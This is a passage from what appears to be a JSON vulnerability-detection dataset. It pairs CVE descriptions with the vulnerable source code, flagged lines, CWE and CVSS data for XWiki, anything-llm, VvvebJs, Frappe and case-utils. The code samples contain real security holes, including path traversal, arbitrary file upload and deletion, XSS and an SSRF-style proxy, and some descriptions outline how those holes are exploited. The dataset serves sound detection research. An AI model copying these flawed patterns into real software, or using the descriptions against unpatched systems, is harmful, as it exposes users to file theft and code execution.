setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 662,
    "cve": "CVE-2024-3028",
    "description": "mintplex-labs/anything-llm is vulnerable to improper input validation, allowing attackers to read and delete arbitrary files on the server. By manipulating the 'logo_filename' parameter in the 'system-preferences' API endpoint, an attacker can construct requests to read sensitive files or the application's '.env' file, and even delete files by setting the 'logo_filename' to the path of the target file and invoking the 'remove-logo' API endpoint. This vulnerability is due to the lack of proper sanitization of user-supplied input.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/files/logo.js",
          "content": "const path = require(\"path\");\nconst fs = require(\"fs\");\nconst { getType } = require(\"mime\");\nconst { v4 } = require(\"uuid\");\nconst { SystemSettings } = require(\"../../models/systemSettings\");\nconst LOGO_FILENAME = \"anything-llm.png\";\n\nfunction validFilename(newFilename = \"\") {\n  return ![LOGO_FILENAME].includes(newFilename);\n}\n\nfunction getDefaultFilename() {\n  return LOGO_FILENAME;\n}\n\nasync function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}\n\nfunction fetchLogo(logoPath) {\n  if (!fs.existsSync(logoPath)) {\n    return {\n      found: false,\n      buffer: null,\n      size: 0,\n      mime: \"none/none\",\n    };\n  }\n\n  const mime = getType(logoPath);\n  const buffer = fs.readFileSync(logoPath);\n  return {\n    found: true,\n    buffer,\n    size: buffer.length,\n    mime,\n  };\n}\n\nasync function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}\n\nasync function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}\n\nmodule.exports = {\n  fetchLogo,\n  renameLogoFile,\n  removeCustomLogo,\n  validFilename,\n  getDefaultFilename,\n  determineLogoFilepath,\n  LOGO_FILENAME,\n};\n"
        }
      ],
      "method_level": [
        "async function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}",
        "async function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}",
        "async function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "    customLogoPath = path.join(basePath, currentLogoFilename);"
        },
        {
          "line_no": 55,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)"
        },
        {
          "line_no": 56,
          "content": "    : path.join(__dirname, `../../storage/assets/${originalFilename}`);"
        },
        {
          "line_no": 58,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)"
        },
        {
          "line_no": 59,
          "content": "    : path.join(__dirname, `../../storage/assets/${newFilename}`);"
        },
        {
          "line_no": 68,
          "content": "    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)"
        },
        {
          "line_no": 69,
          "content": "    : path.join(__dirname, `../../storage/assets/${logoFilename}`);"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.0
  },
  {
    "id": 588,
    "cve": "CVE-2024-3569",
    "description": "A Denial of Service (DoS) vulnerability exists in the mintplex-labs/anything-llm repository when the application is running in 'just me' mode with a password. An attacker can exploit this vulnerability by making a request to the endpoint using the [validatedRequest] middleware with a specially crafted 'Authorization:' header. This vulnerability leads to uncontrolled resource consumption, causing a DoS condition.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/middleware/validatedRequest.js",
          "content": "const { SystemSettings } = require(\"../../models/systemSettings\");\nconst { User } = require(\"../../models/user\");\nconst { decodeJWT } = require(\"../http\");\n\nasync function validatedRequest(request, response, next) {\n  const multiUserMode = await SystemSettings.isMultiUserMode();\n  response.locals.multiUserMode = multiUserMode;\n  if (multiUserMode)\n    return await validateMultiUserRequest(request, response, next);\n\n  // When in development passthrough auth token for ease of development.\n  // Or if the user simply did not set an Auth token or JWT Secret\n  if (\n    process.env.NODE_ENV === \"development\" ||\n    !process.env.AUTH_TOKEN ||\n    !process.env.JWT_SECRET\n  ) {\n    next();\n    return;\n  }\n\n  if (!process.env.AUTH_TOKEN) {\n    response.status(401).json({\n      error: \"You need to set an AUTH_TOKEN environment variable.\",\n    });\n    return;\n  }\n\n  const auth = request.header(\"Authorization\");\n  const token = auth ? auth.split(\" \")[1] : null;\n\n  if (!token) {\n    response.status(401).json({\n      error: \"No auth token found.\",\n    });\n    return;\n  }\n\n  const bcrypt = require(\"bcrypt\");\n  const { p } = decodeJWT(token);\n  if (!bcrypt.compareSync(p, bcrypt.hashSync(process.env.AUTH_TOKEN, 10))) {\n    response.status(401).json({\n      error: \"Invalid auth token found.\",\n    });\n    return;\n  }\n\n  next();\n}\n\nasync function validateMultiUserRequest(request, response, next) {\n  const auth = request.header(\"Authorization\");\n  const token = auth ? auth.split(\" \")[1] : null;\n\n  if (!token) {\n    response.status(401).json({\n      error: \"No auth token found.\",\n    });\n    return;\n  }\n\n  const valid = decodeJWT(token);\n  if (!valid || !valid.id) {\n    response.status(401).json({\n      error: \"Invalid auth token.\",\n    });\n    return;\n  }\n\n  const user = await User.get({ id: valid.id });\n  if (!user) {\n    response.status(401).json({\n      error: \"Invalid auth for user.\",\n    });\n    return;\n  }\n\n  if (user.suspended) {\n    response.status(401).json({\n      error: \"User is suspended from system\",\n    });\n    return;\n  }\n\n  response.locals.user = user;\n  next();\n}\n\nmodule.exports = {\n  validatedRequest,\n};\n"
        }
      ],
      "method_level": [
        "async function validatedRequest(request, response, next) {\n  const multiUserMode = await SystemSettings.isMultiUserMode();\n  response.locals.multiUserMode = multiUserMode;\n  if (multiUserMode)\n    return await validateMultiUserRequest(request, response, next);\n\n  // When in development passthrough auth token for ease of development.\n  // Or if the user simply did not set an Auth token or JWT Secret\n  if (\n    process.env.NODE_ENV === \"development\" ||\n    !process.env.AUTH_TOKEN ||\n    !process.env.JWT_SECRET\n  ) {\n    next();\n    return;\n  }\n\n  if (!process.env.AUTH_TOKEN) {\n    response.status(401).json({\n      error: \"You need to set an AUTH_TOKEN environment variable.\",\n    });\n    return;\n  }\n\n  const auth = request.header(\"Authorization\");\n  const token = auth ? auth.split(\" \")[1] : null;\n\n  if (!token) {\n    response.status(401).json({\n      error: \"No auth token found.\",\n    });\n    return;\n  }\n\n  const bcrypt = require(\"bcrypt\");\n  const { p } = decodeJWT(token);\n  if (!bcrypt.compareSync(p, bcrypt.hashSync(process.env.AUTH_TOKEN, 10))) {\n    response.status(401).json({\n      error: \"Invalid auth token found.\",\n    });\n    return;\n  }\n\n  next();\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "      error: \"Invalid auth token found.\","
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 508,
    "cve": "CVE-2024-29272",
    "description": "Arbitrary File Upload vulnerability in VvvebJs before version 1.7.5, allows unauthenticated remote attackers to execute arbitrary code and obtain sensitive information via the sanitizeFileName parameter in save.php.",
    "vulnerability": {
      "file_level": [
        {
          "name": "save.php",
          "content": "<?php\n/*\nCopyright 2017 Ziadin Givan\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\nhttps://github.com/givanz/VvvebJs\n*/\n\ndefine('MAX_FILE_LIMIT', 1024 * 1024 * 2);//2 Megabytes max html file size\n\nfunction sanitizeFileName($file, $allowedExtension = 'html') {\n\t//sanitize, remove double dot .. and remove get parameters if any\n\t$file = __DIR__ . '/' . preg_replace('@\\?.*$@' , '', preg_replace('@\\.{2,}@' , '', preg_replace('@[^\\/\\\\a-zA-Z0-9\\-\\._]@', '', $file)));\n\t\n\t//allow only .html extension\n\tif ($allowedExtension) {\n\t\t$file = preg_replace('/\\.[^.]+$/', '', $file) . \".$allowedExtension\";\n\t}\n\treturn $file;\n}\n\nfunction showError($error) {\n\theader($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);\n\tdie($error);\n}\n\n$html   = '';\n$file   = '';\n$action = '';\n\nif (isset($_POST['startTemplateUrl']) && !empty($_POST['startTemplateUrl'])) {\n\t$startTemplateUrl = sanitizeFileName($_POST['startTemplateUrl']);\n\t$html = file_get_contents($startTemplateUrl);\n} else if (isset($_POST['html'])){\n\t$html = substr($_POST['html'], 0, MAX_FILE_LIMIT);\n}\n\nif (isset($_POST['file'])) {\n\t$file = sanitizeFileName($_POST['file'], false);\n}\n\nif (isset($_GET['action'])) {\n\t$action = $_GET['action'];\n}\n\nif ($action) {\n\t//file manager actions, delete and rename\n\tswitch ($action) {\n\t\tcase 'rename':\n\t\t\t$newfile = sanitizeFileName($_POST['newfile'], false);\n\t\t\tif ($file && $newfile) {\n\t\t\t\tif (rename($file, $newfile)) {\n\t\t\t\t\techo \"File '$file' renamed to '$newfile'\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error renaming file '$file' renamed to '$newfile'\");\n\t\t\t\t}\n\t\t\t}\n\t\tbreak;\n\t\tcase 'delete':\n\t\t\tif ($file) {\n\t\t\t\tif (unlink($file)) {\n\t\t\t\t\techo \"File '$file' deleted\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error deleting file '$file'\");\n\t\t\t\t}\n\t\t\t}\n\t\tbreak;\n\t\tcase 'saveReusable':\n\t\t    //block or section\n\t\t\t$type = $_POST['type'] ?? false;\n\t\t\t$name = $_POST['name'] ?? false;\n\t\t\t$html = $_POST['html'] ?? false;\n\t\t\t\n\t\t\tif ($type && $name && $html) {\n\t\t\t\t\n\t\t\t\t$file = sanitizeFileName(\"$type/$name\");\n\t\t\t\t$dir = dirname($file);\n\t\t\t\tif (!is_dir($dir)) {\n\t\t\t\t\techo \"$dir folder does not exist\\n\";\n\t\t\t\t\tif (mkdir($dir, 0777, true)) {\n\t\t\t\t\t\techo \"$dir folder was created\\n\";\n\t\t\t\t\t} else {\n\t\t\t\t\t\tshowError(\"Error creating folder '$dir'\\n\");\n\t\t\t\t\t}\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (file_put_contents($file, $html)) {\n\t\t\t\t\techo \"File saved '$file'\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error saving file '$file'\\nPossible causes are missing write permission or incorrect file path!\");\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tshowError(\"Missing reusable element data!\\n\");\n\t\t\t}\n\t\tbreak;\n\t\tcase 'oembedProxy':\n\t\t\theader('Content-Type: application/json');\n\t\t\techo file_get_contents($_GET['url']);\n\t\tbreak;\n\t\tdefault:\n\t\t\tshowError(\"Invalid action '$action'!\");\n\t}\n} else {\n\t//save page\n\tif ($html) {\n\t\tif ($file) {\n\t\t\t$dir = dirname($file);\n\t\t\tif (!is_dir($dir)) {\n\t\t\t\techo \"$dir folder does not exist\\n\";\n\t\t\t\tif (mkdir($dir, 0777, true)) {\n\t\t\t\t\techo \"$dir folder was created\\n\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error creating folder '$dir'\\n\");\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (file_put_contents($file, $html)) {\n\t\t\t\techo \"File saved '$file'\";\n\t\t\t} else {\n\t\t\t\tshowError(\"Error saving file '$file'\\nPossible causes are missing write permission or incorrect file path!\");\n\t\t\t}\t\n\t\t} else {\n\t\t\tshowError('Filename is empty!');\n\t\t}\n\t} else {\n\t\tshowError('Html content is empty!');\n\t}\n}\n"
        }
      ],
      "method_level": [
        "function sanitizeFileName($file, $allowedExtension = 'html') {\n\t//sanitize, remove double dot .. and remove get parameters if any\n\t$file = __DIR__ . '/' . preg_replace('@\\?.*$@' , '', preg_replace('@\\.{2,}@' , '', preg_replace('@[^\\/\\\\a-zA-Z0-9\\-\\._]@', '', $file)));\n\t\n\t//allow only .html extension\n\tif ($allowedExtension) {\n\t\t$file = preg_replace('/\\.[^.]+$/', '', $file) . \".$allowedExtension\";\n\t}\n\treturn $file;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "\t$file = __DIR__ . '/' . preg_replace('@\\?.*$@' , '', preg_replace('@\\.{2,}@' , '', preg_replace('@[^\\/\\\\a-zA-Z0-9\\-\\._]@', '', $file)));"
        }
      ]
    },
    "cwe": [
      "CWE-434"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 197,
    "cve": "CVE-2025-52896",
    "description": "Frappe is a full-stack web application framework. Prior to versions 14.94.2 and 15.57.0, authenticated users could upload carefully crafted malicious files via Data Import, leading to cross-site scripting (XSS). This issue has been patched in versions 14.94.2 and 15.57.0. There are no workarounds for this issue other than upgrading.",
    "vulnerability": {
      "file_level": [
        {
          "name": "frappe/public/js/frappe/form/controls/attach.js",
          "content": "frappe.ui.form.ControlAttach = class ControlAttach extends frappe.ui.form.ControlData {\n\tmake_input() {\n\t\tlet me = this;\n\t\tthis.$input = $('<button class=\"btn btn-default btn-sm btn-attach\">')\n\t\t\t.html(__(\"Attach\"))\n\t\t\t.prependTo(me.input_area)\n\t\t\t.on({\n\t\t\t\tclick: function () {\n\t\t\t\t\tme.on_attach_click();\n\t\t\t\t},\n\t\t\t\tattach_doc_image: function () {\n\t\t\t\t\tme.on_attach_doc_image();\n\t\t\t\t},\n\t\t\t});\n\t\tthis.$value = $(\n\t\t\t`<div class=\"attached-file flex justify-between align-center\">\n\t\t\t\t<div class=\"ellipsis\">\n\t\t\t\t\t<i class=\"fa fa-paperclip\"></i>\n\t\t\t\t\t<a class=\"attached-file-link\" target=\"_blank\"></a>\n\t\t\t\t</div>\n\t\t\t\t<div>\n\t\t\t\t\t<a class=\"btn btn-xs btn-default\" data-action=\"reload_attachment\">${__(\"Reload File\")}</a>\n\t\t\t\t\t<a class=\"btn btn-xs btn-default\" data-action=\"clear_attachment\">${__(\"Clear\")}</a>\n\t\t\t\t</div>\n\t\t\t</div>`\n\t\t)\n\t\t\t.prependTo(me.input_area)\n\t\t\t.toggle(false);\n\t\tthis.input = this.$input.get(0);\n\t\tthis.set_input_attributes();\n\t\tthis.has_input = true;\n\n\t\tfrappe.utils.bind_actions_with_object(this.$value, this);\n\t\tthis.toggle_reload_button();\n\t}\n\tclear_attachment() {\n\t\tlet me = this;\n\t\tif (this.frm) {\n\t\t\tme.parse_validate_and_set_in_model(null);\n\t\t\tme.refresh();\n\t\t\tme.frm.attachments.remove_attachment_by_filename(me.value, async () => {\n\t\t\t\tawait me.parse_validate_and_set_in_model(null);\n\t\t\t\tme.refresh();\n\t\t\t\tme.frm.doc.docstatus == 1 ? me.frm.save(\"Update\") : me.frm.save();\n\t\t\t});\n\t\t} else {\n\t\t\tthis.dataurl = null;\n\t\t\tthis.fileobj = null;\n\t\t\tthis.set_input(null);\n\t\t\tthis.parse_validate_and_set_in_model(null);\n\t\t\tthis.refresh();\n\t\t}\n\t}\n\treload_attachment() {\n\t\tif (this.file_uploader) {\n\t\t\tthis.file_uploader.uploader.upload_files();\n\t\t}\n\t}\n\ton_attach_click() {\n\t\tthis.set_upload_options();\n\t\tthis.file_uploader = new frappe.ui.FileUploader(this.upload_options);\n\t}\n\ton_attach_doc_image() {\n\t\tthis.set_upload_options();\n\t\tthis.upload_options.restrictions.allowed_file_types = [\"image/*\"];\n\t\tthis.file_uploader = new frappe.ui.FileUploader(this.upload_options);\n\t}\n\tset_upload_options() {\n\t\tlet options = {\n\t\t\tallow_multiple: false,\n\t\t\ton_success: (file) => {\n\t\t\t\tthis.on_upload_complete(file);\n\t\t\t\tthis.toggle_reload_button();\n\t\t\t},\n\t\t\trestrictions: {},\n\t\t};\n\n\t\tif (this.frm) {\n\t\t\toptions.doctype = this.frm.doctype;\n\t\t\toptions.docname = this.frm.docname;\n\t\t\toptions.fieldname = this.df.fieldname;\n\t\t\toptions.make_attachments_public = this.df.make_attachment_public\n\t\t\t\t? 1\n\t\t\t\t: this.frm.meta.make_attachments_public;\n\t\t}\n\n\t\tif (this.df.options) {\n\t\t\tObject.assign(options, this.df.options);\n\t\t}\n\t\tthis.upload_options = options;\n\t}\n\n\tset_input(value, dataurl) {\n\t\tthis.last_value = this.value;\n\t\tthis.value = value;\n\t\tif (this.value) {\n\t\t\t// value can also be using this format: FILENAME,DATA_URL\n\t\t\t// Important: We have to be careful because normal filenames may also contain \",\"\n\t\t\tlet file_url_parts = this.value.match(/^([^:]+),(.+):(.+)$/);\n\t\t\tlet filename;\n\t\t\tif (file_url_parts) {\n\t\t\t\tfilename = file_url_parts[1];\n\t\t\t\tdataurl = file_url_parts[2] + \":\" + file_url_parts[3];\n\t\t\t}\n\t\t\tif (this.$input && this.$value) {\n\t\t\t\tthis.$input.toggle(false);\n\t\t\t\tthis.$value\n\t\t\t\t\t.toggle(true)\n\t\t\t\t\t.find(\".attached-file-link\")\n\t\t\t\t\t.html(filename || this.value)\n\t\t\t\t\t.attr(\"href\", dataurl || this.value);\n\t\t\t} else {\n\t\t\t\tthis.$wrapper.html(`\n\t\t\t\t\t  <div class=\"attached-file flex justify-between align-center\">\n\t\t\t\t\t\t<div class=\"ellipsis\">\n\t\t\t\t\t\t  <a href=\"${dataurl || this.value}\" target=\"_blank\">${filename || this.value}</a>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t  </div>\n\t\t\t\t`);\n\t\t\t}\n\t\t} else {\n\t\t\tthis.$input.toggle(true);\n\t\t\tthis.$value.toggle(false);\n\t\t}\n\t}\n\n\tget_value() {\n\t\treturn this.value || null;\n\t}\n\n\tasync on_upload_complete(attachment) {\n\t\tif (this.frm) {\n\t\t\tawait this.parse_validate_and_set_in_model(attachment.file_url);\n\t\t\tthis.frm.attachments.update_attachment(attachment);\n\t\t\tthis.frm.doc.docstatus == 1 ? this.frm.save(\"Update\") : this.frm.save();\n\t\t}\n\t\tthis.set_value(attachment.file_url);\n\t}\n\n\ttoggle_reload_button() {\n\t\tthis.$value\n\t\t\t.find('[data-action=\"reload_attachment\"]')\n\t\t\t.toggle(this.file_uploader && this.file_uploader.uploader.files.length > 0);\n\t}\n};\n"
        }
      ],
      "method_level": [
        "set_input(value, dataurl) {\n\t\tthis.last_value = this.value;\n\t\tthis.value = value;\n\t\tif (this.value) {\n\t\t\t// value can also be using this format: FILENAME,DATA_URL\n\t\t\t// Important: We have to be careful because normal filenames may also contain \",\"\n\t\t\tlet file_url_parts = this.value.match(/^([^:]+),(.+):(.+)$/);\n\t\t\tlet filename;\n\t\t\tif (file_url_parts) {\n\t\t\t\tfilename = file_url_parts[1];\n\t\t\t\tdataurl = file_url_parts[2] + \":\" + file_url_parts[3];\n\t\t\t}\n\t\t\tif (this.$input && this.$value) {\n\t\t\t\tthis.$input.toggle(false);\n\t\t\t\tthis.$value\n\t\t\t\t\t.toggle(true)\n\t\t\t\t\t.find(\".attached-file-link\")\n\t\t\t\t\t.html(filename || this.value)\n\t\t\t\t\t.attr(\"href\", dataurl || this.value);\n\t\t\t} else {\n\t\t\t\tthis.$wrapper.html(`\n\t\t\t\t\t  <div class=\"attached-file flex justify-between align-center\">\n\t\t\t\t\t\t<div class=\"ellipsis\">\n\t\t\t\t\t\t  <a href=\"${dataurl || this.value}\" target=\"_blank\">${filename || this.value}</a>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t  </div>\n\t\t\t\t`);\n\t\t\t}\n\t\t} else {\n\t\t\tthis.$input.toggle(true);\n\t\t\tthis.$value.toggle(false);\n\t\t}\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 110,
          "content": "\t\t\t\t\t.html(filename || this.value)"
        },
        {
          "line_no": 116,
          "content": "\t\t\t\t\t\t  <a href=\"${dataurl || this.value}\" target=\"_blank\">${filename || this.value}</a>"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_version": 4.0
  },
  {
    "id": 63,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# Portions of this file contributed by NIST are governed by the following\n# statement:\n#\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to Title 17 Section 105 of the\n# United States Code, this software is not subject to copyright\n# protection within the United States. NIST assumes no responsibility\n# whatsoever for its use by other parties, and makes no guarantees,\n# expressed or implied, about its quality, reliability, or any other\n# characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\nThe function local_uuid() should be used in code where a user could be expected to opt in to non-random UUIDs.\n\"\"\"\n\n__version__ = \"0.4.0\"\n\n__all__ = [\"configure\", \"local_uuid\"]\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = 